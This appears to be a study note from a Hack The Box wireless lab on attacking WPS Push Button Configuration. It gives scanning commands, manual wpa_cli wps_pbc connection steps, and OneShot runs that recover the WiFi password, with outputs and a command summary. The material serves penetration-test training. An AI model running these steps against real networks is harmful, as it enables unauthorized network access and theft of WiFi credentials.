---
title: Push Button Configurations
description: Push Button Configurations
date: '2026-09-21'
tags: []
published: true
slug: push-button-configurations
category: wifi
folder: misc-attacks-on-wps
order: 10
---
# Push Button Configuration (PBC)

## What is PBC?

**Push Button Configuration** is the simplest WPS method: press a button on the router, press a button on your device, and they connect — no password typing required.

---

## How PBC Actually Works

1. **Physical button press** — most routers have a WPS button (or virtual button in admin settings)
2. **Listening window** — once pressed, the router waits (usually **2 minutes**) for a device to request a connection
3. **Device connects** — during that window, any device requesting access can connect, no password needed

📝 This is commonly used for things like connecting printers to WiFi without typing a password.

---

## Step 1: Check If a Network Uses PBC

Scan with airodump-ng and check the WPS column:

```shellsession
iccys@htb[/htb]$ airodump-ng wlan0mon -c 1 --wps

 CH  1 ][ Elapsed: 0 s ][ 2024-08-28 21:29 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                    ESSID

 D8:D6:3D:EB:29:D5  -47   0       22        0    0   1   54   WPA2 CCMP   PSK  2.0 LAB,DISP,PBC,KPAD  HackTheWireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  F2:B3:16:65:D6:90  -29    0 - 1      0        1         HackTheWireless
```

The `PBC` label in the WPS column confirms this network supports Push Button Configuration.

---

## The Real-World Scenario

If you're physically on-site (like during a penetration test) and can reach the router, you can press its actual WPS button yourself. This opens the connection window — and lets you connect without ever knowing the password.

Two ways to do this:

1. **Manually**, using `wpa_cli`
2. **Automated**, using a tool called **OneShot**

---

## Method 1: Manual Connection with wpa_cli

### Step 1: Find the Target's BSSID

```shellsession
iccys@htb[/htb]$ iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'

          Cell 01 - Address: D8:D6:3D:EB:29:D5
                    Quality=61/70  Signal level=-49 dBm  
                    ESSID:"HackTheWireless"
                    IE: IEEE 802.11i/WPA2 Version 1
```

Or, using `wpa_cli` instead:

```shellsession
iccys@htb[/htb]$ wpa_cli scan_results

Selected interface 'wlan0'
bssid / frequency / signal level / flags / ssid
d8:d6:3d:eb:29:d5   2412    -49 [WPA2-PSK-CCMP][WPS-PBC][ESS]   HackTheWireless
```

Notice the `[WPS-PBC]` tag confirming PBC support.

### Step 2: Press the Button and Connect

As soon as you (or someone) physically presses the WPS button on the router, immediately run:

```shellsession
iccys@htb[/htb]$ wpa_cli wps_pbc D8:D6:3D:EB:29:D5

Selected interface 'wlan0'
OK
```

### Step 3: Confirm the Connection

Check the connection status:

```shellsession
iccys@htb[/htb]$ systemctl status wpa_supplicant

● wpa_supplicant.service - WPA supplicant
     Loaded: loaded (/lib/systemd/system/wpa_supplicant.service; enabled; vendor preset: enabled)
    Drop-In: /run/systemd/system/service.d
             └─zzz-lxc-service.conf
     Active: active (running) since Fri 2024-08-16 13:19:25 UTC; 6h ago
   Main PID: 205 (wpa_supplicant)
      Tasks: 1 (limit: 4579)
     Memory: 7.0M
     CGroup: /system.slice/wpa_supplicant.service
             └─205 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant

Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: WPS-SUCCESS
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: CTRL-EVENT-DSCP-POLICY clear_all
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: SME: Trying to authenticate with d8:d6:3d:eb:29:d5 (SSID='HackTheWireless' freq=2412 MHz)
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: Trying to associate with d8:d6:3d:eb:29:d5 (SSID='HackTheWireless' freq=2412 MHz)
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: Associated with d8:d6:3d:eb:29:d5
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
Aug 16 19:55:25 WiFiIntro wpa_supplicant[205]: wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed [id=3 id_str=]
```

The line **"WPS-SUCCESS"** confirms it worked.

### Step 4: Get an IP Address

```shellsession
iccys@htb[/htb]$ sudo dhclient wlan0
```

### Step 5: Confirm You're Connected

```shellsession
iccys@htb[/htb]$ ifconfig

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 43  bytes 6665 (6.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 42  bytes 7530 (7.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

You now have an IP address (`192.168.1.23`) — you're connected!

---

## Method 2: Automated with [OneShot](https://github.com/fulvius31/OneShot/tree/master)

OneShot can do all of the above for you automatically, and even hands you the actual WiFi password.

### Step 1: Enable Monitor Mode

```shellsession
iccys@htb[/htb]$ airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    183 avahi-daemon
    205 wpa_supplicant
    215 avahi-daemon
    225 NetworkManager
   1215 dhclient

PHY Interface   Driver      Chipset

phy1    wlan0       htb80211_chipset    HTB ChipSet of 802.11 radio(s) for mac80211
```

### Step 2: Run OneShot with the PBC Flag

```shellsession
iccys@htb[/htb]$ python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc

[*] Running wpa_supplicant…
[*] Starting WPS push button connection…
[*] Scanning…
[*] Selected AP: D8:D6:3D:EB:29:D5
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with D8:D6:3D:EB:29:D5 (ESSID: HackTheWireless)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Sending WPS Message M1…
[*] Received WPS Message M2
[*] Sending WPS Message M3…
[*] Received WPS Message M4
[*] Sending WPS Message M5…
[*] Received WPS Message M6
[*] Sending WPS Message M7…
[*] Received WPS Message M8
[+] WPS PIN: '<PBC mode>'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackTheWireless'
```

🎉 OneShot handled the entire M1–M8 message exchange automatically and returned the WiFi password directly.

📝 **Lab note:** In the HTB lab environment, the router's WPS button is automatically "pressed" every 15 seconds — so you don't need a real physical button for this exercise.

---

## Why PBC Is a Security Risk

PBC is convenient, but that convenience is also its weakness:

- **Anyone nearby** can attempt to connect during that 2-minute listening window — not just the intended device
- If an attacker is physically present (or times things right), they can slip in during that window

📝 **Best practice:** For serious security, disable WPS entirely and rely on strong, unique WiFi passwords instead.

---

## Command Summary

```bash
airodump-ng wlan0mon -c 1 --wps                              # Check if a network supports PBC mode

#############DONT FORGET TO STOP MONITER MODE BEFORE RUNNING################
iwlist wlan0 scan | grep 'Cell\|Quality\|ESSID\|IEEE'         # Find target BSSID (method 1)
wpa_cli scan_results                                          # Find target BSSID (alternate method)
wpa_cli wps_pbc <BSSID>                                        # Manually trigger a PBC connection
systemctl status wpa_supplicant                                # Check connection status
sudo dhclient wlan0                                             # Get an IP address
ifconfig                                                        # Confirm the connection

# OneShot automated method
airmon-ng start wlan0                                           # Enable monitor mode
python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc               # Auto-connect via PBC and retrieve the password
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`--wps`|Show WPS details during a scan|
|`-c 1`|Target channel 1|
|`wps_pbc <BSSID>`|Tell wpa_cli to attempt a PBC connection to this router|
|`-i wlan0mon`|Use the `wlan0mon` monitor-mode interface|
|`--pbc`|Tell OneShot to use the Push Button Configuration method|

